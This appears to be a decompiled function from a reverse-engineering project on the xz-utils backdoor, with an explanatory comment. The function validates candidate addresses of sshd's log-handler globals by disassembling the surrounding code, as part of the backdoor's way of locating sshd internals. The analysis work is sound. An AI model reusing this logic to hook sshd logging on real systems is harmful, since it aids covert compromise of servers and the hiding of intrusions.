// /home/kali/xzre-ghidra/xzregh/102B10_validate_log_handler_pointers.c
// Function: validate_log_handler_pointers @ 0x102B10
// Calling convention: __stdcall
// Prototype: BOOL __stdcall validate_log_handler_pointers(void * addr1, void * addr2, void * search_base, u8 * code_end, string_references_t * refs, global_context_t * global)


/*
 * AutoDoc: Given two candidate addresses for sshd’s `log_handler`/`log_handler_ctx` globals, it replays the code sequence that writes them.
 * The helper enforces that the pointers are distinct and within 0x10 bytes of one another, walks the cached string-reference
 * entries to find the LEA that materialises the handler struct, bounds the routine via `x86_dasm`/`find_function`, and then
 * searches for MOV [mem],reg instructions touching each address. Only when both stores appear inside that function does it accept
 * the pair as the genuine log-handler slots.
 */

#include "xzre_types.h"

BOOL validate_log_handler_pointers
               (void *addr1,void *addr2,void *search_base,u8 *code_end,string_references_t *refs,
               global_context_t *global)

{
  void *mem_address;
  BOOL BVar1;
  long lVar2;
  u8 *puVar3;
  u8 **ppuVar4;
  u64 branch_disp;
  int opcode;
  u64 insn_size;
  void *log_handler_slot;
  long gap;
  u8 *insn_ptr;
  u8 **scan_ctx;
  u8 *block_end;
  u8 *function_end;
  BOOL scan_success;
  u8 *dasm_ip;
  
  ppuVar4 = &block_end;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)ppuVar4 = 0;
    ppuVar4 = (u8 **)((long)ppuVar4 + 4);
  }
  if ((addr1 != addr2 && addr1 != (void *)0x0) && (addr2 != (void *)0x0)) {
    lVar2 = (long)addr2 - (long)addr1;
    if (addr2 <= addr1) {
      lVar2 = (long)addr1 - (long)addr2;
    }
    if (((lVar2 < 0x10) &&
        (mem_address = refs->entries[0x13].func_start, mem_address != (void *)0x0)) &&
       (puVar3 = (u8 *)refs->entries[0x14].func_start, puVar3 != (u8 *)0x0)) {
      ppuVar4 = (u8 **)refs->entries[0x14].func_end;
      BVar1 = find_lea_instruction_with_mem_operand
                        (puVar3,(u8 *)ppuVar4,(dasm_ctx_t *)&block_end,mem_address);
      puVar3 = block_end;
      if (BVar1 != FALSE) {
        BVar1 = x86_dasm((dasm_ctx_t *)&block_end,function_end + (long)block_end,(u8 *)ppuVar4);
        if ((BVar1 != FALSE) && (scan_success == 0x168)) {
          scan_ctx = (u8 **)0x0;
          puVar3 = function_end + (long)dasm_ip + (long)block_end;
          find_function(puVar3,(void **)0x0,&scan_ctx,(u8 *)search_base,code_end,
                        global->uses_endbr64);
          ppuVar4 = scan_ctx;
        }
        BVar1 = find_instruction_with_mem_operand_ex
                          (puVar3,(u8 *)ppuVar4,(dasm_ctx_t *)0x0,0x109,addr1);
        if (BVar1 != FALSE) {
          BVar1 = find_instruction_with_mem_operand_ex
                            (puVar3,(u8 *)ppuVar4,(dasm_ctx_t *)0x0,0x109,addr2);
          return (uint)(BVar1 != FALSE);
        }
      }
    }
  }
  return FALSE;
}

